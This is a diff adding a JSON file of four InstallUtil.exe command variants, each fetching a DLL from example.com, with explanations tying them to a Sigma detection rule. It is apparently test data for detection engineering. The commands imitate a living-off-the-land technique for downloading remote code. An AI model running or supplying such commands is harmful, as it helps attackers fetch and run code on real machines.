@@ -1,0 +1,18 @@
+[
+  {
+    "output": "InstallUtil.exe /url=http://example.com/file.dll",
+    "explanation": "This command simulates a file download via InstallUtil.exe using a safe mutation technique by using the long-form option /url instead of direct command-line arguments. It aligns with the Sigma rule's detection of HTTP-based URLs."
+  },
+  {
+    "output": "InstallUtil.exe -url https://example.com/file.dll",
+    "explanation": "This command uses substitution by replacing /url with -url, a common equivalent syntax in command-line tools. It still matches the Sigma rule's detection of HTTPS-based URLs."
+  },
+  {
+    "output": "InstallUtil.exe \"/url:ftp://example.com/file.dll\"",
+    "explanation": "This command uses insertion (quotes) and substitution (using the URL format) to simulate a benign test case. It aligns with the Sigma rule's detection of FTP-based URLs."
+  },
+  {
+    "output": "InstallUtil.exe url=http://example.com/file.dll",
+    "explanation": "This command omits the explicit option indicator (like / or -) but still passes the URL parameter in a way that could be accepted by some implementations. It matches the Sigma rule's detection of HTTP-based URLs."
+  }
+]
